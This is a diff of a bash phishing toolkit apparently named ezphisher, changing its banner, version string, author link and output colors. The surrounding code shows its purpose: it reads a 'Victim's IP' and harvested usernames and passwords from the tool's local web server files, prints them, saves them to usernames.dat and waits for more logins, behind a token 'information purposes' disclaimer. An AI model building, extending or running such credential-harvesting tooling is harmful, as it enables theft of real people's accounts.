@@ -51,13 +51,13 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE} 		▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
-		${ORANGE} 		█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
-		${ORANGE} 		██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
-		${ORANGE} 		█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
-		${ORANGE} 		▀███▀             █       █   ▐               █  ▀███▀     █   
-											 ▀     ▀                   ▀            ▀    
-				${GREEN}		[-] Tool Developed by AnonHexo${WHITE}
+		${ORANGE} 	▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
+		${ORANGE} 	█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
+		${ORANGE} 	██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
+		${ORANGE} 	█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
+		${ORANGE} 	▀███▀             █       █   ▐               █  ▀███▀     █   
+		${ORANGE}						 ▀     ▀                   ▀            ▀    
+                                ${WHITE} 			v1.1
 	EOF
 }
 
@@ -165,8 +165,8 @@ about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}AnonHexo
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/AnonHexo
-		${GREEN}Version  ${RED}:  ${ORANGE}1.2
+		${GREEN}GitHub   ${RED}:  ${ORANGE}https://github.com/AnonHexo/ezphisher
+		${GREEN}Version  ${RED}:  ${ORANGE}1.1
 
 		${REDBG}${WHITE} Created for information purposes and not for illegal uses.${RESETBG}
 
@@ -204,18 +204,18 @@ capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}$IP"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in: ${BLUE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
 
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
-	PASSWORD=$(grep -o 'Password:.*' .server/www/usernames.txt | cut -d ":" -f2)
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
-	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in : ${BLUE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
